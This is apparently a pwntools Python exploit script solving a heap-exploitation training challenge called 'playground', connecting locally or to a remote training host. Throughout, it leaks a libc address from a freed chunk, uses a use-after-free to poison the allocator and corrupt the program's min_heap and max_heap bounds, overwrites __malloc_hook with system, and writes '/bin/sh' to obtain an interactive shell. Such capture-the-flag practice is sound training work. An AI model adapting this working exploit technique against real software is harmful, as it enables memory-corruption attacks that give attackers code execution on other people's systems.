from pwn import *
if "REMOTE" not in args:
	c= process('./test')
else:
	c = remote("bin.training.jinblack.it", 4010)


## AUTOMATED FUNCTIONS
def malloc(size,label):
    c.recvuntil(b"> ")
    c.sendline(b"malloc %d" % size)
    c.recvuntil(b"==> ")
    addr = c.recvline(False)
    print("malloc :: "+label+" :: "+str(addr))
    return addr
def free(p):
    c.recvuntil(b"> ")
    c.sendline(b"free %b" % p)
    c.recvuntil(b"ok")
    print("freed :: "+str(p))
    return
def show(p,n):
    contents = []
    c.recvuntil(b"> ")
    print(b'show '+ p + b' '+ b'%d' % n)
    c.sendline(b'show '+ p + b' %d' % n)
    for i in range(n):
        c.recvuntil(b":")
        contents.insert(i,c.recvline(False))
        #contents[i] = str(contents[i]).replace(" ", "")
        #print(int(contents[i][2::],16))
    return contents
def write(p,n,string):
    c.recvuntil(b"> ")
    c.sendline(b'write '+ p + b' %d' %n)
    c.recvuntil(b"==> read")
    c.sendline(string)

    c.recvuntil(b"==> done")
    print("printed :: "+str(string)+" at "+str(p))
    return
def byte_addr_to_hex(byte_addr):
    ascii_addr = byte_addr[2::].decode("ascii")
    hex_addr = int(ascii_addr,16)
    #print("converted ::: "+ ascii_addr+" to : "+str(hex_addr))
    return hex_addr
def int_to_sendable(int_addr):
    sendable = "0000"+hex(int_addr)[2::]
    sendable = bytearray.fromhex(sendable)[::-1]
    return sendable
### ELFs
libc = ELF("./libc-2.27.so")
exe = ELF("./playground_patched")
ld = ELF("./ld-2.27.so")
### Hooks
free_hook = libc.symbols["__free_hook"]
malloc_hook = libc.symbols["__malloc_hook"]
### One Gadget
onegadget = 0x4f2c5
onegadget = 0x4f322
onegadget = 0x10a38c
### Pointers
ptr1 = b"0x555555559260"
zero = b"0x555555559000"
### Offsets
vmmap_libc_local = 0x7ffff79e2000 #I will not know the address of the libc on the remote machine
                                  #but I suppose I will still have the same offset from the first
                                  #leak to this address
delta_offset = 0x5f1010 #This offset is calculated by subtracting the first local leak to the
                        #known address of the libc in the local file
max_heap_offset = 0x1040a0
main_offset = 0x1011d9
##PID AND MAIN LEAK
c.recvuntil(b"pid: ")
pid = c.recvline(False)
c.recvuntil(b"main: ")
main = c.recvline(False)

print("pid  ::: "+ str(pid))
print("main ::: "+ str(main))
print("malloc_hook :::"+str(hex(malloc_hook)))
print("free_hook :::"+str(hex(free_hook)))

### Calculate Max Heap
print("Ready to leak the libc")
big = malloc(10000,"big")
small = malloc(128,"small")
free(big)
leak = show(big,1)[0]
log.info(f"{leak} is of type {type(leak)}")
libc.address = byte_addr_to_hex(leak) - 96 -libc.symbols["main_arena"]
program_base  = byte_addr_to_hex(main) - exe.symbols["main"]
exe.address = program_base
max_heap_addr = exe.symbols["max_heap"]
min_heap_addr = exe.symbols["min_heap"]
malloc_hook_addr = libc.symbols["__malloc_hook"]
system = libc.symbols["system"]

print("The base of the program is at ::: "+ hex(program_base))
print("The max_heap is found at ::: "+ hex(max_heap_addr))
print("The min_heap is found at ::: "+ hex(min_heap_addr))

one_gadget_addr = libc.address + onegadget

print("the base of the libc is found at ::: "+hex(libc.address))
print("the malloc_hook is found at ::: "+hex(malloc_hook_addr))
print("the address of the onegadget is ::: "+hex(one_gadget_addr))

gdb.attach(c)
input('wait')
input('corpt min and max')
print("Ready to corrupt min_heap and max_heap")
payload = int_to_sendable(min_heap_addr-0x8)
input('use after free, before')
a = malloc(128,"a")
input('free')
free(a)
input('corrupt')
write(a,9,payload)
print("I'm going to allocate the min_heap")
input('get first fair')
cc = malloc(128,"cc")
input('get arbitrary')
arbitrary = malloc(128,"arb")#reached segmentation fault !!
print("Now the min_heap and the max_heap should both be blank!")
## eggsploit
input('exploit')
write(bytes(hex(max_heap_addr),"utf-8"),9,b"\xff"*8)

bin_sh_ = malloc(128,"__bin_sh")

write(bytes(hex(malloc_hook_addr),"utf-8"),9,p64(system))
write(bin_sh_,9,b"/bin/sh\x00")

c.interactive()
